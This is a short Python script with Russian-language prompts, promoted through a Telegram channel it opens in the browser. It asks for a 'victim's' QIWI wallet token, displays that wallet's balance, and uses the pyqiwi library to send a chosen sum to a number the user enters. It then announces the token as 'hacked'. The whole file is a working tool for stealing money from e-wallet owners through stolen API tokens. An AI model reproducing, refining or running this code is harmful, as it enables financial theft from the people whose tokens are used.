import pyqiwi

import sys

import webbrowser as wb

print("СКРИПТ КАНАЛА: @jenrysoft")
print("Версия: 0.1")
print("Сделана: @Azimjonm2333")

wb.open("https://t.me/jenrysoft")
def main ():
        while True:
                Token = input('\nВведите токен жертвы: ')

                try:
                        wallet = pyqiwi.Wallet(token=Token)
                        print('Баланс: ', wallet.balance(), 'рублей')
                        number = input('Пишите номер куда перевести деньги: ') 
                        amount = int (input('Сумма в рублях которые хотите вывести: '))
                        comment = input('Комент к платежу: ')
                        wallet.send(pid=99, recipient = number, amount = amount, comment=comment)
                        print ('\nВы успешно взломали киви токен: ', Token)
                        
                except Exception:
                        print ('\nНеправильный токен или что-то пошло не так. Попробуйте ещё раз!')
                        main ()
main()
